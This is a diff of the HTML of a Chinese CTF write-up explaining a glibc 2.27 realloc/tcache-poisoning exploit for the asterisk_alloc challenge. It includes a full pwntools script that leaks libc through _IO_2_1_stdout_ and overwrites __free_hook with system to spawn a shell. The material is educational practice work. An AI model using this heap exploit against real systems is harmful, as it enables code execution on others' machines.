@@ -1,7 +1,5 @@
-<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-TWCTF_online_2019_asterisk_alloc-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记"><meta property="og:image" content><meta property="og:title" content="BUU-TWCTF_online_2019_asterisk_alloc-WP"><meta property="og:description" content="这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1203.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-19T13:20:00+00:00"><meta property="article:modified_time" content="2021-03-19T13:20:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-TWCTF_online_2019_asterisk_alloc-WP"><meta name=twitter:description content="这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记"><script src=https://www.cjovi.icu/js/feather.min.js></script>
-<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.bfb8dec0e2220d86f104bd8230dbf2c35b583e46ccfef90bb620854db94ef7a5.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
-<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
-<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>BUU-TWCTF_online_2019_asterisk_alloc-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记"><meta property="og:image" content><meta property="og:title" content="BUU-TWCTF_online_2019_asterisk_alloc-WP"><meta property="og:description" content="这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1203.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-19T13:20:00+00:00"><meta property="article:modified_time" content="2021-03-19T13:20:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-TWCTF_online_2019_asterisk_alloc-WP"><meta name=twitter:description content="这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记"><script src=https://www.cjovi.icu/js/feather.min.js></script><link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.6dc922b4122291f1967a53b3e802e564596ed5068a8571e4221c9ead17563c3a.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
 <a href=/posts.html>All posts</a>
 <a href=/about.html>About</a>
 <a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-TWCTF_online_2019_asterisk_alloc-WP</h1><div class=meta>Posted on Mar 19, 2021</div></div><section class=body><p>这道题涉及到 <code>realloc</code> 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。</p><p>首先 <code>realloc</code> 在申请的空间不同时，行为也是不同的。我们记申请的大小为 Nsize，ptr 指向的堆块的大小为 Osize，那么在调用 <code>realloc(ptr,Nsize)</code> 时有以下几种情况</p><ul><li><code>Nsize == 0</code> 此时等同于 <code>free</code>，且返回值为 0</li><li><code>Nsize &lt; Osize</code> 切割原 chunk，讲多余部分 <code>free</code> 掉</li><li><code>Nsize == Osize</code> 不做操作</li><li><code>Nsize > Osize</code> 尽可能地尝试通过后向合并（包括 Tcache 这样的一般不会被合并的 chunk）来满足申请，如果通过后向合并可以满足 Nsize，则<strong>进行合并</strong>并返回原指针；否则会新 <code>malloc</code> 一个 Nsize 的 chunk，将原 chunk 的数据拷贝至新 chunk，<code>free</code> 掉原 chunk（注意这种情况下<strong>不会后向合并</strong>）</li><li><code>Nsize = -1</code> 也就是申请一个机器无法分配的大小，由于我没有看源码，不知道实际行为如何，但是通过调试得到的结论为返回 0，且不会对 ptr 原指向的 chunk 进行 <code>free</code></li></ul><p>本题的漏洞很明显，主要是 <code>double free</code>，又是 2.27 版本的 libc，通过 <code>Tcache poisoning</code> 可以很容易地劫持各种 hook，那么主要的问题就在于如何 leak libc，程序本身没有输出的功能，据说这个时候要 leak 的话基本就是要攻击 <code>_IO_FILE</code> 了。原理是 <code>main_arena</code> 和 <code>_IO_2_1_stdout_</code> 低二字节相同，通过爆破四位就可以分配到 <code>_IO_2_1_stdout_</code> 上，然后可以修改其 <code>flag</code> 和 <code>_IO_write_base</code> 来实现输出。</p><p>第一步要塞满 <code>Tcache</code> 并获得一个 <code>Unsorted Bin</code>，并且要能实现对该 <code>Unsorted Bin</code>的 <code>fd</code> 的修改。本来的话用 <code>malloc</code> 可以容易地解决，但是本题 <code>malloc</code> 只能用一次，所以还是要通过灵活使用 <code>realloc</code> 来实现。具体方法为</p><ul><li>通过 <code>realloc</code> 申请并释放三个大小不同的 chunk，记作 A B C。</li><li>将 B 申请回来，<code>free</code> 七次，填满 <code>Tcache</code></li><li>通过 <code>realloc(0)</code> 实现一次释放和指针置零，此时 B 进入 <code>Unsorted bin</code> 中（C 存在的目的是为了防止 这里 top_chunk 的合并）</li><li>通过 <code>realloc</code> 申请回 A（如果上一次不使用 <code>realloc(0)</code> 而是直接 <code>free</code> 这里就无法申请回 A 了）</li><li>通过 <code>realloc</code> 扩展 A，将 B 合并，实现 <code>chunk overlapping</code>，此时我们拥有了对 B 的 UAF 的能力，考虑写 B 的 <code>fd</code>，由于 B 是 <code>Unsorted bin</code> 的尾节点 <code>fd</code> 会指向 <code>main_arena + 96</code>，我们写 <code>fd</code> 的低二字节，让 <code>fd</code> 指向 <code>_IO_2_1_stdout_</code>。由于我们只能使用 <code>realloc</code> 和 一个指针来多次分配申请，所以这里还需要改写 B 的 <code>size</code> 域，保证之后清空指针的时候 B 不会进入我们 <code>poisoning</code> 的链中，只要把 <code>size</code> 改成一个乱七八糟的值就行了。</li><li>申请 <code>size(B)</code>，<code>realloc(0)</code></li><li>再次申请，此时就获得了一个在 <code>_IO_2_1_stdout_</code> 的 chunk 了。</li></ul><p>也就是下面这样</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>realloc(0x10,&#39;\n&#39;)
@@ -24,98 +22,98 @@
 </span></span><span style=display:flex><span>realloc(0x80,struct.pack(&#34;B&#34;,libc.symbols[&#34;_IO_2_1_stdout_&#34;] &amp; 0xFF))
 </span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
 </span></span><span style=display:flex><span>realloc(0x80,p64(0xfbad1887) + p64(0) * 3 + &#39;\x58&#39;)#_IO_write_base point to _IO_file_jumps
-</span></span></code></pre></div><p>注意对 <code>_IO_2_1_stdout_</code> 的改写，需要把 <code>flag</code> 改写为 <code>0xfbad1887</code>，这样之后调用 <code>write</code> 的时候就会输出从 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 中的数据了。那么我们在改写 <code>flag</code> 的同时改写 <code>_IO_write_base</code>，让它指向 <code>_IO_write_base</code> 原指向的位置附近的一个存有 libc 地址的空间就可以实现 leak 了。这里我选择让它指向 <code>_IO_file_jumps</code>。</p><p>实现 leak 之后就是重来一次 <code>Tcache poisoning</code>，分配到 <code>__free_hook</code> 上写 <code>system</code> getshell。这里又会比较麻烦，因为当前分配到的是一个显然不合法的 chunk，如果 <code>free</code> 的话必然报错，所以就需要 <code>realloc(-1)</code> 来避免 <code>free</code> 并置空指针，之后的操作和之前一样，只要改变 A B C 的大小就基本可以照抄之前的方法了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
-</span></span><span style=display:flex><span># coding=utf-8
-</span></span><span style=display:flex><span>from pwn import *
+</span></span></code></pre></div><p>注意对 <code>_IO_2_1_stdout_</code> 的改写，需要把 <code>flag</code> 改写为 <code>0xfbad1887</code>，这样之后调用 <code>write</code> 的时候就会输出从 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 中的数据了。那么我们在改写 <code>flag</code> 的同时改写 <code>_IO_write_base</code>，让它指向 <code>_IO_write_base</code> 原指向的位置附近的一个存有 libc 地址的空间就可以实现 leak 了。这里我选择让它指向 <code>_IO_file_jumps</code>。</p><p>实现 leak 之后就是重来一次 <code>Tcache poisoning</code>，分配到 <code>__free_hook</code> 上写 <code>system</code> getshell。这里又会比较麻烦，因为当前分配到的是一个显然不合法的 chunk，如果 <code>free</code> 的话必然报错，所以就需要 <code>realloc(-1)</code> 来避免 <code>free</code> 并置空指针，之后的操作和之前一样，只要改变 A B C 的大小就基本可以照抄之前的方法了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
 </span></span><span style=display:flex><span>import struct
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>#sh = process(&#34;./TWCTF_online_2019_asterisk_alloc&#34;)
-</span></span><span style=display:flex><span>#libc = ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./TWCTF_online_2019_asterisk_alloc&#34;)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#libc = ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh = remote(&#34;node3.buuoj.cn&#34;,29556)
-</span></span><span style=display:flex><span>libc = ELF(&#34;./libcs/libc-2.27-buu.so&#34;)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;node3.buuoj.cn&#34;</span>,<span style=color:#40a070>29556</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libcs/libc-2.27-buu.so&#34;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def malloc(size,payload):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,&#39;1&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Size: &#34;,str(size))
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;Data: &#34;,payload)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>malloc</span>(size,payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size: &#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Data: &#34;</span>,payload)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def calloc(size,payload):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,&#39;2&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Size: &#34;,str(size))
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;Data: &#34;,payload)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>calloc</span>(size,payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size: &#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Data: &#34;</span>,payload)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def realloc(size,payload):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,&#39;3&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Size: &#34;,str(size))
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;Data: &#34;,payload)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>realloc</span>(size,payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size: &#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Data: &#34;</span>,payload)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def free_m():
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,&#39;4&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Which: &#34;,&#39;m&#39;)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>free_m</span>():
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Which: &#34;</span>,<span style=color:#4070a0>&#39;m&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def free_c():
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,&#39;4&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Which: &#34;,&#39;c&#39;)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>free_c</span>():
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Which: &#34;</span>,<span style=color:#4070a0>&#39;c&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def free_r():
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,&#39;4&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Which: &#34;,&#39;r&#39;)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>free_r</span>():
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Which: &#34;</span>,<span style=color:#4070a0>&#39;r&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>realloc(0x10,&#39;\n&#39;)
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
-</span></span><span style=display:flex><span>realloc(0x80,&#39;\n&#39;)
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
-</span></span><span style=display:flex><span>realloc(0x20,&#39;\n&#39;)
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0x10</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0x80</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0x20</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>realloc(0x80,&#39;\n&#39;)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0x80</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>for i in range(7):
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
 </span></span><span style=display:flex><span>    free_r()
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)#free to unsorted_bin
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)<span style=color:#60a0b0;font-style:italic>#free to unsorted_bin</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>realloc(0x10,&#39;\n&#39;)
-</span></span><span style=display:flex><span>overWriteByte = struct.pack(&#34;&lt;H&#34;,libc.symbols[&#34;_IO_2_1_stdout_&#34;] &amp; 0xFFFF)
-</span></span><span style=display:flex><span>realloc(0x10 + 0x80 + 0x10,&#39;a&#39; * 0x10 + p64(0) + p64(0x21) + overWriteByte)
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
-</span></span><span style=display:flex><span>realloc(0x80,struct.pack(&#34;B&#34;,libc.symbols[&#34;_IO_2_1_stdout_&#34;] &amp; 0xFF))
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
-</span></span><span style=display:flex><span>realloc(0x80,p64(0xfbad1887) + p64(0) * 3 + &#39;\x58&#39;)#_IO_write_base point to _IO_file_jumps
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0x10</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>overWriteByte <span style=color:#666>=</span> struct<span style=color:#666>.</span>pack(<span style=color:#4070a0>&#34;&lt;H&#34;</span>,libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;_IO_2_1_stdout_&#34;</span>] <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0x10</span> <span style=color:#666>+</span> <span style=color:#40a070>0x80</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>+</span> overWriteByte)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0x80</span>,struct<span style=color:#666>.</span>pack(<span style=color:#4070a0>&#34;B&#34;</span>,libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;_IO_2_1_stdout_&#34;</span>] <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFF</span>))
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0x80</span>,p64(<span style=color:#40a070>0xfbad1887</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>3</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x58</span><span style=color:#4070a0>&#39;</span>)<span style=color:#60a0b0;font-style:italic>#_IO_write_base point to _IO_file_jumps</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>libc_base = u64(sh.recv(8)) - libc.symbols[&#34;_IO_file_jumps&#34;]
-</span></span><span style=display:flex><span>log.success(&#34;libc_base:&#34; + hex(libc_base))
-</span></span><span style=display:flex><span>free_hook = libc_base + libc.symbols[&#34;__free_hook&#34;]
-</span></span><span style=display:flex><span>system_addr = libc_base + libc.symbols[&#34;system&#34;]
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;_IO_file_jumps&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> hex(libc_base))
+</span></span><span style=display:flex><span>free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
+</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;system&#34;</span>]
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.sendline(&#34;100&#34;)#pass
-</span></span><span style=display:flex><span>realloc(-1,&#39;\n&#39;)#set ptr=0 without free
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;100&#34;</span>)<span style=color:#60a0b0;font-style:italic>#pass</span>
+</span></span><span style=display:flex><span>realloc(<span style=color:#666>-</span><span style=color:#40a070>1</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)<span style=color:#60a0b0;font-style:italic>#set ptr=0 without free</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>realloc(0xC0,&#39;\n&#39;)
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
-</span></span><span style=display:flex><span>realloc(0xD0,&#39;\n&#39;)
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
-</span></span><span style=display:flex><span>realloc(0xE0,&#39;\n&#39;)
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0xC0</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0xD0</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0xE0</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>realloc(0xD0,&#39;\n&#39;)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0xD0</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>for i in range(7):
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
 </span></span><span style=display:flex><span>    free_r()
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)#free to unsorted_bin
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)<span style=color:#60a0b0;font-style:italic>#free to unsorted_bin</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>realloc(0xC0,&#39;\n&#39;)
-</span></span><span style=display:flex><span>realloc(0xC0 + 0x10 + 0xD0,&#39;a&#39; * 0xC0 + p64(0) + p64(0x61) + p64(free_hook - 8))
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
-</span></span><span style=display:flex><span>realloc(0xD0,p64(free_hook - 8))
-</span></span><span style=display:flex><span>realloc(0,&#39;&#39;)
-</span></span><span style=display:flex><span>realloc(0xD0,&#39;/bin/sh\x00&#39; + p64(system_addr))
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0xC0</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0xC0</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> <span style=color:#40a070>0xD0</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xC0</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x61</span>) <span style=color:#666>+</span> p64(free_hook <span style=color:#666>-</span> <span style=color:#40a070>8</span>))
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0xD0</span>,p64(free_hook <span style=color:#666>-</span> <span style=color:#40a070>8</span>))
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>realloc(<span style=color:#40a070>0xD0</span>,<span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> p64(system_addr))
 </span></span><span style=display:flex><span>free_r()
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.interactive()
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
